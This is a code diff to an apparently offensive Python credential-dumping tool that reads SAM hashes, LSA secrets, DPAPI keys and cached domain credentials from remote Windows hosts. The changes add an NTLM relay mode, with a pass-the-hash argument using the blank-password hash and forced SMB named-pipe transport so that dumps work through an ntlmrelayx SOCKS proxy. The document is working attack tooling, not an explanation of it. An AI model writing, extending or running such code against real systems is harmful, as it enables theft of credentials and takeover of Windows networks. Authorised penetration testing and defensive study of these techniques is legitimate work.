@@ -296,7 +296,7 @@ def _auth_args(args):
     elif args.password:
         a += ['-Password', args.password]
     elif getattr(args, 'no_pass', False):
-        a += ['-Password', '']
+        a += ['-NtlmHash', '31d6cfe0d16ae931b73c59d7e0c089c0']  # PtH forces NTLM-only; relay ignores hash
     if args.kdc:           a += ['-Kdc',         args.kdc]
     if args.aes_key:       a += ['-AesKey',       args.aes_key]
     if args.tgt:           a += ['-Tgt',          args.tgt]
@@ -1971,13 +1971,17 @@ def dump_host(host, args, auth):
         _smb_conn   = _smb_connect(host, args) if need_syskey else None
         _reg_auth_failed = False
         _reg_fail_rc     = 0
+        # Relay mode: Titanis Reg normally uses RPC-over-TCP (port 135) which
+        # ntlmrelayx SOCKS cannot relay. -PreferSmb forces named-pipe transport
+        # so all connections stay on port 445.
+        _smb_flags = ['-PreferSmb'] if getattr(args, 'no_pass', False) else []
 
         with _RemoteRegistry(_smb_conn, verbose=args.verbose):
             if need_syskey:
                 if args.verbose:
                     print(f'[*] {host}: syskey', file=sys.stderr)
                 sk_raw, sk_rc = _run(REG_BIN, 'syskey', auth,
-                                     [host, '-BackupSemantics'],
+                                     [host, '-BackupSemantics'] + _smb_flags,
                                      verbose=args.verbose)
                 syskey_val = _syskey_from_output(sk_raw)
                 if syskey_val == '(not retrieved)':
@@ -1994,7 +1998,7 @@ def dump_host(host, args, auth):
                     if args.verbose:
                         print(f'[*] {host}: SAM hashes', file=sys.stderr)
                     sam_raw = _reg('dumpsam', auth, host,
-                                   ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'],
+                                   ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'] + _smb_flags,
                                    verbose=args.verbose)
                     sam_hashes = _dump_sam(host, sam_raw, sec_sam)
 
@@ -2003,7 +2007,7 @@ def dump_host(host, args, auth):
                     if args.verbose:
                         print(f'[*] {host}: LSA secrets', file=sys.stderr)
                     lsa_raw = _reg('dumplsasecrets', auth, host,
-                                   ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'],
+                                   ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'] + _smb_flags,
                                    verbose=args.verbose)
                     nlkm_hex, dpapi_system_hex = _dump_lsa(host, lsa_raw, auth, sec_lsa,
                                                             verbose=args.verbose)
@@ -2013,7 +2017,7 @@ def dump_host(host, args, auth):
                         print(f'[*] {host}: credential cache', file=sys.stderr)
                     cache_raw = _reg('list', auth, host,
                                      ['-BackupSemantics', r'HKLM\SECURITY\Cache',
-                                      '-IncludeData', '-ConsoleOutputStyle', 'Csv'],
+                                      '-IncludeData', '-ConsoleOutputStyle', 'Csv'] + _smb_flags,
                                      verbose=args.verbose)
                     _dump_cache(host, cache_raw, nlkm_hex, sec_cache)
 
